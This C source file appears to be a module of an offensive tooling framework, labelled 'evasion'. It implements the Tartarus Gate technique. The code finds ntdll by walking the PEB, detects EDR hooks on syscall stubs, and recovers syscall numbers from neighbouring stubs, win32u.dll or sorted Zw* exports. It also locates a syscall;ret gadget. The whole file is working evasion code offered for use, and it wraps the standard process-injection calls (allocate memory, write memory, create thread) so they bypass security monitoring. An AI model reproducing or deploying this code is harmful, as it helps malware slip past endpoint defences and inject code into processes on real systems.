// chunk: evasion/tartarus_gate
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: low
// note: Tartarus Gate — cross-DLL SSN resolution. Searches both ntdll.dll and win32u.dll for clean syscall stubs. If the target stub is hooked (0xE9 jmp at byte 0 or byte 3), walks neighbors in both DLLs to find unhooked stubs and calculates SSN by offset. Falls back to Zw* RVA sorting. Cross-references results across DLLs for maximum resilience against partial or full hooking of any single module.

#ifndef CHUNK_TARTARUS_GATE
#define CHUNK_TARTARUS_GATE

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

// --- PEB-based ntdll base resolution (avoids hooked GetModuleHandle) ---

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _TG_PEB_LDR_DATA {
    ULONG Length;
    UCHAR Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} TG_PEB_LDR_DATA;

typedef struct _TG_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} TG_LDR_DATA_TABLE_ENTRY;

static HMODULE tg_get_module_peb(const WCHAR *target_name) {
    TG_PEB_LDR_DATA *ldr;
    __asm__ volatile ("mov %%gs:0x60, %%rax\n\t"
                      "mov 0x18(%%rax), %0"
                      : "=r"(ldr) :: "rax");

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    while (entry != head) {
        TG_LDR_DATA_TABLE_ENTRY *mod =
            (TG_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry -
            __builtin_offsetof(TG_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));

        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            WCHAR *name = mod->BaseDllName.Buffer;
            const WCHAR *target = target_name;
            int match = 1;
            while (*target) {
                WCHAR a = *name, b = *target;
                if (a >= L'A' && a <= L'Z') a += 32;
                if (b >= L'A' && b <= L'Z') b += 32;
                if (a != b) { match = 0; break; }
                name++;
                target++;
            }
            if (match && *name == L'\0')
                return (HMODULE)mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

// --- Hook detection ---

static int tg_is_clean_stub(BYTE *code) {
    // Standard stub: 4C 8B D1 (mov r10,rcx) B8 xx xx 00 00 (mov eax,SSN)
    if (code[0] != 0x4C || code[1] != 0x8B || code[2] != 0xD1)
        return 0;
    if (code[3] != 0xB8)
        return 0;
    // Tartarus extension: verify bytes after SSN aren't patched with hooks
    if (code[8] == 0xE9 || code[8] == 0xE8)
        return 0;
    return 1;
}

// --- Export table helpers ---

typedef struct {
    DWORD rva;
    DWORD name_idx;
} tg_export_t;

// Try direct extraction or neighbor walking from a module's export table
static DWORD tg_resolve_from_module(HMODULE mod, const char *func_name) {
    if (!mod) return 0;

    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    DWORD target_idx = (DWORD)-1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (strcmp(name, func_name) == 0) {
            target_idx = i;
            break;
        }
    }
    if (target_idx == (DWORD)-1) return 0;

    BYTE *target_code = base + funcs[ords[target_idx]];

    // Phase 1: Direct extraction if stub is clean
    if (tg_is_clean_stub(target_code))
        return *(DWORD *)(target_code + 4);

    // Phase 2: Neighbor walking (Halo's Gate with Tartarus hook detection)
    for (int dist = 1; dist < 500; dist++) {
        if (target_idx + dist < exp->NumberOfNames) {
            char *n = (char *)(base + names[target_idx + dist]);
            if (n[0] == 'N' && n[1] == 't') {
                BYTE *c = base + funcs[ords[target_idx + dist]];
                if (tg_is_clean_stub(c)) {
                    DWORD neighbor_ssn = *(DWORD *)(c + 4);
                    if (neighbor_ssn >= (DWORD)dist)
                        return neighbor_ssn - dist;
                }
            }
        }
        if (target_idx >= (DWORD)dist) {
            char *n = (char *)(base + names[target_idx - dist]);
            if (n[0] == 'N' && n[1] == 't') {
                BYTE *c = base + funcs[ords[target_idx - dist]];
                if (tg_is_clean_stub(c)) {
                    DWORD neighbor_ssn = *(DWORD *)(c + 4);
                    return neighbor_ssn + dist;
                }
            }
        }
    }

    return 0;
}

// Sort Zw* exports by RVA as fallback (position in sorted order = SSN)
static DWORD tg_resolve_from_zw_sort(HMODULE mod, const char *func_name) {
    if (!mod) return 0;

    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    tg_export_t entries[512];
    DWORD count = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        char *name = (char *)(base + names[i]);
        if (name[0] == 'Z' && name[1] == 'w') {
            entries[count].rva = funcs[ords[i]];
            entries[count].name_idx = i;
            count++;
        }
    }

    if (count == 0) return 0;

    // Insertion sort by RVA
    for (DWORD i = 1; i < count; i++) {
        tg_export_t key = entries[i];
        int j = (int)i - 1;
        while (j >= 0 && entries[j].rva > key.rva) {
            entries[j + 1] = entries[j];
            j--;
        }
        entries[j + 1] = key;
    }

    // Build Zw equivalent: NtXxx -> ZwXxx
    char zw_name[128];
    zw_name[0] = 'Z';
    zw_name[1] = 'w';
    int k = 2;
    for (const char *p = func_name + 2; *p && k < 126; p++)
        zw_name[k++] = *p;
    zw_name[k] = '\0';

    for (DWORD i = 0; i < count; i++) {
        char *name = (char *)(base + names[entries[i].name_idx]);
        if (strcmp(name, zw_name) == 0)
            return i;
    }

    return 0;
}

// --- Cross-DLL resolution: ntdll -> win32u -> Zw sort ---

static DWORD tg_resolve_ssn_cross_dll(HMODULE ntdll, HMODULE win32u, const char *func_name) {
    DWORD ssn;

    // Strategy 1: Direct/neighbor resolution from ntdll
    ssn = tg_resolve_from_module(ntdll, func_name);
    if (ssn != 0) return ssn;

    // Strategy 2: Try win32u (many EDRs don't hook win32u at all)
    if (win32u) {
        ssn = tg_resolve_from_module(win32u, func_name);
        if (ssn != 0) return ssn;
    }

    // Strategy 3: Zw* sort on ntdll (avoids reading stub bytes entirely)
    ssn = tg_resolve_from_zw_sort(ntdll, func_name);
    if (ssn != 0) return ssn;

    // Strategy 4: Zw* sort on win32u as final fallback
    if (win32u) {
        ssn = tg_resolve_from_zw_sort(win32u, func_name);
        if (ssn != 0) return ssn;
    }

    return 0;
}

// --- Gadget finder: search both DLLs for syscall;ret ---

static void *tg_find_gadget(HMODULE ntdll, HMODULE win32u) {
    HMODULE modules[2] = { ntdll, win32u };

    for (int m = 0; m < 2; m++) {
        if (!modules[m]) continue;

        BYTE *base = (BYTE *)modules[m];
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                BYTE *start = base + sec[i].VirtualAddress;
                DWORD size = sec[i].Misc.VirtualSize;
                for (DWORD j = 0; j < size - 2; j++) {
                    if (start[j] == 0x0F && start[j + 1] == 0x05 && start[j + 2] == 0xC3)
                        return (void *)(start + j);
                }
            }
        }
    }
    return NULL;
}

static int init_indirect_syscalls(void) {
    // Get ntdll via PEB walk (avoids hooked GetModuleHandle)
    HMODULE ntdll = tg_get_module_peb(L"ntdll.dll");
    if (!ntdll) ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    // Load win32u.dll as secondary source
    HMODULE win32u = GetModuleHandleA("win32u.dll");
    if (!win32u) win32u = LoadLibraryA("win32u.dll");

    ssn_NtAllocateVirtualMemory  = tg_resolve_ssn_cross_dll(ntdll, win32u, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory     = tg_resolve_ssn_cross_dll(ntdll, win32u, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx         = tg_resolve_ssn_cross_dll(ntdll, win32u, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = tg_resolve_ssn_cross_dll(ntdll, win32u, "NtQuerySystemInformation");
    syscall_ret_gadget = tg_find_gadget(ntdll, win32u);

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            ssn_NtQuerySystemInformation != 0 &&
            syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
